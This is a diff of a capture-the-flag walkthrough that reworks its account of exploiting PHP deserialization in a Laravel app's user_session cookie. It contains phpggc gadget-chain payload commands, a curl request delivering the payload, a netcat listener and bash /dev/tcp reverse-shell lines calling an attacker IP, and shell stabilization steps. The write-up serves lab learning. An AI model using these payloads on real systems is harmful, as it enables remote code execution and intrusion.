@@ -111,69 +111,34 @@ After experimenting with different actions, I discovered that **logging out and 
 
 ---
 
-# PHP Deserialization Vulnerability
+# Exploitation — PHP Deserialization
 
-Decoding the `user_session` cookie:
+The application stores user session information inside the **`user_session` cookie**.
 
-```bash
-echo "user_session_cookie" | base64 -d
-```
+During analysis it became clear that the application **deserializes user-controlled data**, making it vulnerable to **PHP object deserialization**.
 
-The decoded content revealed a serialized PHP object.
+To exploit this vulnerability I used the tool **phpggc (PHP Generic Gadget Chains)**.
 
-Example structure:
-
-```
-O:23:"App\Support\SessionData":3:{...}
-```
-
-This strongly suggested that the application performs:
-
-```
-unserialize()
-```
-
-on user-controlled data.
-
-This behavior indicates a **PHP deserialization vulnerability**, allowing attackers to craft malicious objects that trigger code execution.
-
----
-
-# Exploitation with phpggc
-
-To exploit the vulnerability, I used **phpggc**, a tool for generating PHP deserialization gadget chains.
-
-Example payload generation:
+First, I generated a malicious serialized object that executes the command `id`.
 
 ```bash
-php -d phar.readonly=0 phpgcc Laravel/RCE9 system "curl ATTACKER_IP"
+./phpggc Laravel/RCE1 system "id" | base64 -w0
 ```
 
-The **Laravel/RCE9 gadget chain** allows execution of arbitrary system commands when the serialized object is processed by the vulnerable application.
+Explanation:
 
-The generated payload was encoded and injected into the `user_session` cookie.
+* **phpggc** → generates a malicious serialized PHP object
+* **Laravel/RCE1** → gadget chain targeting Laravel applications
+* **system "id"** → command that will execute on the server
+* **base64 -w0** → encodes the payload so it can be inserted safely into an HTTP cookie
 
----
+The command returns a **Base64 encoded payload**.
 
-# Payload Adjustment
+This payload was inserted into the **`user_session` cookie** using the browser developer tools (**F12 → Application → Cookies**).
 
-Initially, the payload did not work.
+The original value of the `user_session` cookie was replaced with the malicious payload.
 
-After testing different values, I manually modified the cookie by adding:
-
-```
-%3D
-```
-
-to the end of the Base64 payload.
-
-Once the application accepted the modified cookie, the payload executed successfully.
-
----
-
-# Confirming Remote Code Execution
-
-Instead of receiving an external callback, the application response displayed:
+After refreshing the page, the application executed the payload and the following output appeared at the top of the page:
 
 ```
 uid=33(www-data)
@@ -181,64 +146,64 @@ gid=33(www-data)
 groups=33(www-data)
 ```
 
-This confirmed that **remote code execution (RCE)** was successful.
+This confirmed that **Remote Code Execution (RCE)** was successful.
 
 ---
 
 # Reverse Shell
 
-Next, I generated a reverse shell payload.
+After confirming command execution, the next step was obtaining a reverse shell.
+
+First, I started a **netcat listener** on my attacking machine.
 
 ```bash
-php -d phar.readonly=0 phpgcc Laravel/RCE9 system \
-"/bin/bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/443 0>&1'"
+nc -lnvp 443
 ```
 
-Listener:
+Next, I generated a reverse shell payload using **phpggc**.
 
 ```bash
-nc -lvnp 443
+PAYLOAD=$(./phpggc Laravel/RCE1 system "/bin/bash -c 'sh -i >& /dev/tcp/10.0.74.125/443 0>&1'" | base64 -w0)
 ```
 
-After sending the payload through the `user_session` cookie, a reverse shell connection was established.
+The payload was executed using **curl**, while keeping the valid Laravel session cookies.
 
-Shell access:
-
-```
-www-data@locked
-```
-
----
-
-# Shell Stabilization
-
-To stabilize the shell:
+Only the `user_session` cookie was replaced with the malicious payload.
 
 ```bash
-script /dev/null -c bash
+curl -H "Cookie: laravel_session=COOKIE; XSRF-TOKEN=COOKIE; user_session=$PAYLOAD" \
+http://172.16.7.208/secrets
 ```
 
-Then:
+After sending the request, the netcat listener received the connection, giving a shell on the target machine.
+
+Example commands executed inside the shell:
+
+```bash
+id
+whoami
+```
+
+This confirmed access as:
 
 ```
-CTRL + Z
-stty raw -echo; fg
+www-data
 ```
-
-This created a fully interactive shell.
 
 ---
 
 # User Flag
 
-The user flag was located in the root directory.
+After gaining shell access, I searched for the user flag.
+
+The flag was located in the root directory.
 
 ```bash
 cd /
 ls
 ```
 
-Example:
+Example file:
 
 ```
 user_flag_impossible_to_guess.txt
